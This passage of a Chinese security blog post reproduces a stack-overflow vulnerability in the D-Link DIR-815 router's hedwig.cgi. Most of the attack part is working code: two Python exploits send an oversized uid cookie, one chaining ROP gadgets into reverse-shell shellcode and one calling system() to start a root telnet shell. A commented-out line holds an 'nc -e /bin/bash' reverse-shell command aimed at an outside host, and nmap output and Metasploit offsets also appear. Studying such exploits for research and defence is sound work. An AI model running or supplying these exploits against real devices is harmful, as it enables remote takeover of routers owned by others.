+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">"little"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"mips"</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">get_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">):</span>
+
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="s2">""</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20</span><span class="s2">"</span>
+    <span class="c1">#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf</span><span class="s2">"</span><span class="c1">#192.168.79.145</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xab\x0f\x02\x24\x0c\x09\x09\x01</span><span class="s2">"</span>
+
+    <span class="n">sleep</span> <span class="o">=</span> <span class="mh">0x56BD0</span> <span class="c1">#sleep jr ra 0x7678edf4</span>
+    <span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x57E50</span>
+    <span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x3B8A8</span>
+    <span class="n">gadget3</span> <span class="o">=</span> <span class="mh">0x14F28</span>
+    <span class="n">gadget4</span> <span class="o">=</span> <span class="mh">0x1DD08</span><span class="c1">#0x15C84#0xBB44</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="c1">#1009-9*4</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s0</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span>       <span class="c1"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">sleep</span><span class="p">)</span>         <span class="c1"># s2 = jr $(sp+0x24)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s3</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget4</span><span class="p">)</span>       <span class="c1"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s5</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s6</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s7</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># fp</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget1</span><span class="p">)</span>       <span class="c1"># ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'B'</span> <span class="o">*</span> <span class="mh">0x24</span> <span class="c1"># mipsrop.tail() 0x24B padding</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget3</span><span class="p">)</span>       <span class="c1"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'c'</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="c1"># mipsrop.stackfinder() 0x18B padding</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
+
+    <span class="n">cookie</span><span class="o">=</span><span class="s1">'uid='</span> <span class="o">+</span> <span class="n">get_payload</span><span class="p">(</span><span class="mi">973</span><span class="p">,</span> <span class="mh">0x77f34000</span><span class="p">)</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'Cookie'</span>        <span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
+        <span class="s1">'Content-Type'</span>  <span class="p">:</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">,</span>
+        <span class="s1">'Content-Length'</span><span class="p">:</span> <span class="s1">'100'</span>
+        <span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'uid'</span><span class="p">:</span><span class="s1">'1234'</span><span class="p">}</span>
+    <span class="n">ip_port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">url</span><span class="o">=</span><span class="s2">"http://"</span><span class="o">+</span><span class="n">ip_port</span><span class="o">+</span><span class="s2">"/hedwig.cgi"</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+</pre></div>
+<p>测试结果：获取shell</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094341-a7705f7a-a53b-1.png"/></p>
+<h2 data-content="1" id="e47775e1f7ed0acf5fb6f564748f81b1">利用Firmadyne仿真进行测试</h2>
+<p>Firmadyne的安装过程这里就不再继续介绍，这里是用它来测试，能够启动起来。并且访问firmadyne给其分配的默认web接口192.168.0.1。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094342-a7d29fdc-a53b-1.png"/></p>
+<p>nmap扫描查看开放的端口，目前3各端口分别对应dns53,http80,upnp49152。</p>
+<div class="highlight"><pre><span></span>Starting Nmap <span class="m">7</span>.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-05-24 <span class="m">16</span>:21 CST
+Nmap scan report <span class="k">for</span> <span class="m">192</span>.168.0.1
+Host is up <span class="o">(</span><span class="m">0</span>.00041s latency<span class="o">)</span>.
+Not shown: <span class="m">997</span> closed ports
+PORT      STATE SERVICE VERSION
+<span class="m">53</span>/tcp    open  domain  dnsmasq <span class="m">2</span>.45
+<span class="m">80</span>/tcp    open  http    D-Link DIR-815 WAP http config <span class="m">1</span>.01
+<span class="m">49152</span>/tcp open  upnp    D-Link DIR-815 WAP UPnP <span class="m">1</span>.01 <span class="o">(</span>UPnP <span class="m">1</span>.0<span class="o">)</span>
+MAC Address: <span class="m">52</span>:54:00:12:34:58 <span class="o">(</span>QEMU virtual NIC<span class="o">)</span>
+Device type: general purpose
+Running: Linux <span class="m">2</span>.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+OS details: Linux <span class="m">2</span>.6.32
+Network Distance: <span class="m">1</span> hop
+Service Info: OS: Linux<span class="p">;</span> Device: WAP<span class="p">;</span> CPE: cpe:/h:dlink:dir-815:1.01, cpe:/o:linux:linux_kernel, cpe:/h:d-link:dir-815
+</pre></div>
+<p>构造exp进行测试</p>
+<p>其实这里需要跟之前qemu系统模式一样，上传gdbsever进行调试确定偏移和libc基地址。这里直接利用师傅帖子中的代码进行测试。这里的基地址是根据firmadyne中用linux内核版本为2.6.32，别的帖子中测试的基地址为0x2aaf8000，并且metasploit里面的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb" target="_blank">payload</a>写到：路由器环境中基地址为0x2aaf8000，qemu环境为0x40854000。两个可以都试试！</p>
+<div class="highlight"><pre><span></span><span class="o">[</span> <span class="s1">'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600'</span>,
+            <span class="o">{</span>
+              <span class="s1">'Offset'</span>      <span class="o">=</span>&gt; <span class="m">973</span>,
+              <span class="s1">'LibcBase'</span>    <span class="o">=</span>&gt; 0x2aaf8000,    <span class="c1"># Router</span>
+              <span class="c1">#'LibcBase'   =&gt; 0x40854000,    # QEMU environment</span>
+              <span class="s1">'System'</span>      <span class="o">=</span>&gt; 0x000531FF,    <span class="c1"># address of system</span>
+              <span class="s1">'CalcSystem'</span>  <span class="o">=</span>&gt; 0x000158C8,    <span class="c1"># calculate the correct address of system</span>
+              <span class="s1">'CallSystem'</span>  <span class="o">=</span>&gt; 0x000159CC,    <span class="c1"># call our system</span>
+            <span class="o">}</span>
+          <span class="o">]</span>
+</pre></div>
+<p>下面编写exp进行测试，利用system函数进行测试。</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">"little"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"mips"</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">get_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+    <span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x45988</span>
+    <span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x159cc</span>
+    <span class="n">system_addr_1</span> <span class="o">=</span> <span class="mh">0x53200</span><span class="o">-</span><span class="mi">1</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_addr_1</span><span class="p">)</span> <span class="c1"># s0</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span>       <span class="c1"># s1</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s2</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s3</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s4</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s5</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s6</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s7</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># fp</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget1</span><span class="p">)</span>       <span class="c1"># ra</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'B'</span> <span class="o">*</span> <span class="mh">0x10</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">cmd</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="c1">#cmd = "nc -e /bin/bash 192.168.79.145 9999"</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">'telnetd -p 222 -l /bin/sh'</span>
+    <span class="n">cookie</span><span class="o">=</span><span class="s1">'uid='</span> <span class="o">+</span> <span class="n">get_payload</span><span class="p">(</span><span class="mi">973</span><span class="p">,</span> <span class="mh">0x2aaf8000</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'Cookie'</span>        <span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
+        <span class="s1">'Content-Type'</span>  <span class="p">:</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">,</span>
+        <span class="s1">'Content-Length'</span><span class="p">:</span> <span class="s1">'100'</span>
+        <span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'uid'</span><span class="p">:</span><span class="s1">'1234'</span><span class="p">}</span>
+    <span class="n">ip_port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">url</span><span class="o">=</span><span class="s2">"http://"</span><span class="o">+</span><span class="n">ip_port</span><span class="o">+</span><span class="s2">"/hedwig.cgi"</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+</pre></div>
+<p>测试结果显示能够执行<code>telnetd -p 222 -l /bin/sh</code>。telnet 上去对应的窗口直接反弹shell。</p>
+<p><img src="telnetdp222.png"/></p>
+<h1 data-content="1" id="57877837d9a5503dbdd8eaba4cb29ac8">在实体机上测试</h1>
+<p>在实体机上刷上1.01的版本，用system方法的exp同样能得到获取shell。</p>
+<h1 data-content="1" id="c9995abaf2b22c1cee821b6a2781cfba">总结</h1>
+<p>到这里，终于分析完了，整个过程其实遇到了不少的坑，从最开始死活到不了第二个sprintf，到后面的qemu系统模式如何修改http配置文件都起不来http服务，还有shellcode的修改等等问题都可能卡好久，最后解决的时候才知道并不是太难的问题。。。还是太菜了！我这都是第二次分析了，才能有个大概的了解，想想一年间的自己到底学到了什么。。。整个流程完全自己复现一遍并且能够很清楚的讲出来，其实个人感觉收获还是很多的，比如路由器缓冲区溢出漏洞的分析调试详细流程，gdb、IDA、Ghidra等工具联调使用，以及该libc的万能gadget等等。<br/>
+感谢H4lo大佬的不厌其烦的回答我的问题！坚持学习不断追赶！</p>
+<h1 data-content="1" id="4bc81ba5dfe04e8a92b014d7dc4f79d1">参考文献</h1>
+<p><a href="https://www.anquanke.com/post/id/179510#h3-8" target="_blank">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>
+<p><a href="https://www.anquanke.com/post/id/187443#h2-9" target="_blank">IOT设备漏洞挖掘从入门到入门（二）- DLink Dir 815漏洞分析及三种方式模拟复现</a></p>
+<p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell" target="_blank">Building MIPS Environment for Router &amp;&amp; PWN</a></p>
+<p><a href="http://shell-storm.org/shellcode/" target="_blank">http://shell-storm.org/shellcode/</a></p>
+<p><a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank">一个mips栈溢出</a></p>
+</div>
+</div>
